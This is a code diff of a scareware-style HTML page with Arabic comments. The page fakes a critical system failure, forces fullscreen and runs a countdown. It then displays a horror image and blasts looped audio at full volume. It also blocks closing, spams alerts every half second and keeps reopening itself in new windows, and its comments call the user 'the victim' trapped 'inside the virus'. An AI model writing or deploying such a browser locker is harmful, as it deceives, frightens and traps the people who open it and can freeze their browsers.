@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SYSTEM_CRITICAL_FAILURE</title>
+    <title>FATAL_ERROR_NON_REMOVABLE</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; font-family: monospace; }
         #terminal { position: relative; z-index: 10; height: 100vh; padding: 20px; color: #f00; text-align: center; display: flex; flex-direction: column; justify-content: center; }
@@ -11,22 +11,27 @@
         #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; display: none; }
     </style>
 </head>
-<body onclick="activateVirus()">
+<body onclick="launchLockdown()">
 
     <div id="terminal">
-        <div style="font-size: 20px; animation: blink 0.1s infinite;">⚠️ SYSTEM OVERRIDE ⚠️</div>
-        <div id="countdown">20</div> <div style="color: #0ff;">> Wiping_OS_Partition...<br>> No_Exit_Detected</div>
+        <div style="font-size: 20px; animation: blink 0.1s infinite;">⚠️ CRITICAL_OS_ERROR ⚠️</div>
+        <div id="countdown">20</div>
+        <div style="color: #0ff;">> OVERRIDING_SYSTEM_CORE...<br>> ANTI_EXIT_MODULE: ACTIVE</div>
     </div>
 
     <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
-    <audio id="sfx" src="tfy-krk.mp3" preload="auto" loop></audio> <script>
+    <audio id="sfx" src="tfy-krk.mp3" preload="auto" loop></audio>
+
+    <script>
         let seconds = 20;
         let active = false;
 
-        // منع الخروج بكل الطرق الممكنة في المتصفح
-        window.onbeforeunload = function() { return "Error"; };
+        // منع إغلاق الصفحة (التحذير قبل الخروج)
+        window.onbeforeunload = function() {
+            return "ERROR: SYSTEM_32_DESTRUCTION_IN_PROGRESS";
+        };
 
-        function activateVirus() {
+        function launchLockdown() {
             if (active) return;
             active = true;
             document.documentElement.requestFullscreen().catch(() => {});
@@ -36,30 +41,31 @@
                 document.getElementById('countdown').innerText = seconds;
                 if (seconds <= 0) {
                     clearInterval(timer);
-                    brutalScare();
+                    executeFinalPhase();
                 }
             }, 1000);
         }
 
-        function brutalScare() {
+        function executeFinalPhase() {
             document.getElementById('terminal').style.display = 'none';
             document.getElementById('horrorImg').style.display = 'block';
             let audio = document.getElementById('sfx');
+            
+            // جعل الصوت صاخب جداً ومستمر
+            audio.volume = 1.0;
             audio.play();
 
-            // ميزة اللاق التام اللي تبلوكي أزرار الصوت والمتصفح سواسوة
+            // ميزة "التعليق" ومنع الخروج سواسوة
             setInterval(() => {
-                // استهلاك المعالج (CPU) باش الضحية ما يقدش يخرج أو ينقص الصوت
-                console.log("LAGGING_SYSTEM..." + Math.random());
-                alert("⚠️ خطأ في النظام: لا يمكن إيقاف العملية!");
+                // تكرار الرسائل المزعجة لعمل "لاق" (Lag)
+                alert("⚠️ طفي كراك.. راك محبوس سواسوة!");
                 
-                // إعادة تشغيل الصوت إذا حاول الضحية كتمه
-                if(audio.paused) audio.play();
-                audio.volume = 1.0; 
-                
-                // فتح نوافذ جديدة لمنع الخروج سواسوة
+                // إذا حاول يخرج، نفتحو الصفحة في نافذة جديدة باش يبقى داخل الفيروس
                 window.open(window.location.href, '_blank');
-            }, 100);
+                
+                // إعادة تشغيل الصوت إذا توقف
+                if(audio.paused) audio.play();
+            }, 500);
         }
     </script>
 </body>
